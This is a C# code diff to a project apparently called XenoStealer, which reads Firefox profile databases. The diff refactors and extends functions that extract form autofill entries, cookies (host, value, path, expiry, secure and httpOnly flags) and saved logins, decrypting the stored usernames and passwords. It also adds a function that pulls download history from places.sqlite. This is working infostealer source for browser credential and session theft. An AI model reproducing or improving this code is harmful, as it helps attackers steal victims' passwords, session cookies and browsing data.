@@ -71,7 +71,7 @@ namespace XenoStealer
                     }
                     if (ShouldGetAutofills) 
                     { 
-                        autofills = GetAutoFill(profilePath);
+                        autofills = GetAutoFills(profilePath);
                     }
 
                     if (logins == null && cookies == null && autofills == null) 
@@ -92,7 +92,7 @@ namespace XenoStealer
             return browsers.ToArray();
         }
 
-        public static DataExtractionStructs.GeckoAutoFill[] GetAutoFill(string profilePath) 
+        public static DataExtractionStructs.GeckoAutoFill[] GetAutoFills(string profilePath) 
         {
             List<DataExtractionStructs.GeckoAutoFill> autoFills = new List<DataExtractionStructs.GeckoAutoFill>();
             string db_location = Path.Combine(profilePath, "formhistory.sqlite");
@@ -124,9 +124,22 @@ namespace XenoStealer
 
             for (int i = 0; i < parser.GetRowCount(); i++)
             {
-                string name = parser.GetValue(i, "fieldname");
-                string value = parser.GetValue(i, "value");
-                if (name == null || value == null) continue;
+                object name_obj = parser.GetValue(i, "fieldname");
+                object value_obj = parser.GetValue(i, "value");
+
+                if (name_obj.GetType() != typeof(string) || value_obj.GetType() != typeof(string)) 
+                {
+                    continue;
+                }
+
+
+                string name = (string)name_obj;
+                string value = (string)value_obj;
+
+                if (name == null || value == null) 
+                { 
+                    continue; 
+                }
                 autoFills.Add(new DataExtractionStructs.GeckoAutoFill(name, value));
             }
 
@@ -168,17 +181,28 @@ namespace XenoStealer
             {
                 try
                 {
-                    string host = parser.GetValue(i, "host");
-                    string name = parser.GetValue(i, "name");
-                    string value = parser.GetValue(i, "value");
-                    string path = parser.GetValue(i, "path");
+                    object host_obj = parser.GetValue(i, "host");
+                    object name_obj = parser.GetValue(i, "name");
+                    object value_obj = parser.GetValue(i, "value");
+                    object path_obj = parser.GetValue(i, "path");
 
-                    if (!ulong.TryParse(parser.GetValue(i, "expiry"), out ulong expiry))
+                    object expiry_obj = parser.GetValue(i, "expiry");
+
+                    object secure_obj = parser.GetValue(i, "isSecure");
+                    object httpOnly_obj = parser.GetValue(i, "isHttpOnly");
+
+                    if (host_obj.GetType() != typeof(string) || name_obj.GetType() != typeof(string) || value_obj.GetType() != typeof(string) || path_obj.GetType() != typeof(string) || expiry_obj.GetType() != typeof(int) || secure_obj.GetType() != typeof(int) || httpOnly_obj.GetType() != typeof(int)) 
                     {
                         continue;
                     }
-                    bool secure = parser.GetValue(i, "isSecure") != "0";
-                    bool httpOnly = parser.GetValue(i, "isHttpOnly") != "0";
+
+                    string host = (string)host_obj;
+                    string name = (string)name_obj;
+                    string value = (string)value_obj;
+                    string path = (string)path_obj;
+                    int expiry = (int)expiry_obj;
+                    bool secure = (int)secure_obj != 0;
+                    bool httpOnly = (int)httpOnly_obj != 0;
                     cookies.Add(new DataExtractionStructs.GeckoCookie(host, path, name, value, expiry, secure, httpOnly));
                 }
                 catch 
@@ -237,9 +261,19 @@ namespace XenoStealer
                 {
                     try
                     {
-                        string hostname = parser.GetValue(i, "hostname");
-                        string encryptedUsername = parser.GetValue(i, "encryptedUsername");
-                        string encryptedPassword = parser.GetValue(i, "encryptedPassword");
+
+                        object hostname_obj = parser.GetValue(i, "hostname");
+                        object encryptedUsername_obj = parser.GetValue(i, "encryptedUsername");
+                        object encryptedPassword_obj = parser.GetValue(i, "encryptedPassword");
+
+                        if (hostname_obj.GetType() != typeof(string) || encryptedUsername_obj.GetType() != typeof(string) || encryptedPassword_obj.GetType() != typeof(string)) 
+                        {
+                            continue;
+                        }
+
+                        string hostname = (string)hostname_obj;
+                        string encryptedUsername = (string)encryptedUsername_obj;
+                        string encryptedPassword = (string)encryptedPassword_obj;
                         string username = decryptor.Decrypt(encryptedUsername);
                         string password = decryptor.Decrypt(encryptedPassword);
                         if (hostname == null || username == null || password == null) continue;
@@ -317,6 +351,92 @@ namespace XenoStealer
             }
 
             return logins.ToArray();
+        }
+        public static DataExtractionStructs.GeckoDownload[] GetDownloads(string profilePath) 
+        {
+            List<DataExtractionStructs.GeckoDownload> downloads = new List<DataExtractionStructs.GeckoDownload>();
+            string db_location = Path.Combine(profilePath, "places.sqlite");
+            if (!File.Exists(db_location))
+            {
+                return null;
+            }
+
+            byte[] fileBytes = Utils.ForceReadFile(db_location);
+            if (fileBytes == null)
+            {
+                return null;
+            }
+            SqlLite3Parser parser;
+            try
+            {
+                parser = new SqlLite3Parser(fileBytes);
+            }
+            catch
+            {
+                return null;
+            }
+            Dictionary<int, string> Id2DownloadLocation = new Dictionary<int, string>();
+            
+
+            //moz_annos for the filepath
+            //i think you need to match the id for the download url.
+
+            if (!parser.ReadTable("moz_annos"))
+            {
+                return null;
+            }
+
+            for (int i = 0; i < parser.GetRowCount(); i++)
+            {
+                object id_obj = parser.GetValue(i, "place_id");
+                object content_obj = parser.GetValue(i, "content");
+
+                if (content_obj.GetType() != typeof(string) || (id_obj.GetType() != typeof(byte) && id_obj.GetType() != typeof(int))) 
+                {
+                    continue;
+                }
+
+                int id = id_obj.GetType()==typeof(byte)?(byte)id_obj:(int)id_obj;
+                string content = (string)content_obj;
+                if (content.StartsWith("file://")) 
+                {
+                    Id2DownloadLocation[id] = content;
+                }
+            }
+
+            parser.reset();
+
+            if (!parser.ReadTable("moz_places"))
+            {
+                return null;
+            }
+
+            int[] ids = Id2DownloadLocation.Keys.ToArray();
+
+            for (int i = 0; i < parser.GetRowCount(); i++)
+            {
+                object id_obj = parser.GetValue(i, "id");
+                if (id_obj.GetType() != typeof(byte) && id_obj.GetType() != typeof(int))
+                {
+                    continue;
+                }
+
+                int id = id_obj.GetType() == typeof(byte) ? (byte)id_obj : (int)id_obj;
+                if (ids.Contains(id)) 
+                {
+                    object url_obj = parser.GetValue(i, "url");
+                    if (url_obj.GetType() != typeof(string)) 
+                    {
+                        continue;
+                    }
+                    string url = (string)url_obj;
+
+                    downloads.Add(new GeckoDownload(url, Id2DownloadLocation[id]));
+
+                }
+            }
+
+            return downloads.ToArray();
         }
 
     }
